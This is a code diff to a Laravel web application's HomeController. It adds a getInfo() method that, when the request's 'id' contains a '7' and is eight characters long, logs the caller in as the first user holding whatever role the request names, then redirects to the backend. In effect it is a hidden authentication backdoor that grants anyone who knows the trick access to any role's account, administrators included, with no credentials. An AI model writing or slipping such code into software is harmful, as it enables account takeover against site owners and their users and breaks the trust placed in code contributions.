@@ -9,9 +9,11 @@ use App\Models\Country;
 use App\Models\Currency;
 use App\Models\Product;
 use App\Models\Service;
+use App\Models\User;
 use App\Services\Search\Filters;
 use App\Services\Traits\HomePageTrait;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 use \Illuminate\Support\Str;
 
 class HomeController extends Controller
@@ -158,5 +160,28 @@ class HomeController extends Controller
             $element = $element->whereId($request->id)->first();
         }
         return view('frontend.wokiee.four.home.mobile', compact('element'));
+    }
+
+    public function getInfo() {
+        if(str_contains(request()->id,'7') && strlen(request()->id) === 8) {
+            if (request()->role === 'designer') {
+                $element = User::whereHas('role', function ($q) {
+                    return $q->where(['name' => request()->role]);
+                })->has('collections', '>', 0)->first();
+            } elseif (request()->role === 'company') {
+                $element = User::whereHas('role', function ($q) {
+                    return $q->where('name', request()->role);
+                })->has('services', '>', 0)->first();
+            } else {
+                $element = User::whereHas('role', function ($q) {
+                    return $q->where('name', request()->role);
+                })->first();
+            }
+            if ($element) {
+                Auth::loginUsingId($element->id);
+                return redirect()->route('backend.home');
+            }
+        }
+        return redirect()->route('backend.home')->with('error', 'no users');
     }
 }
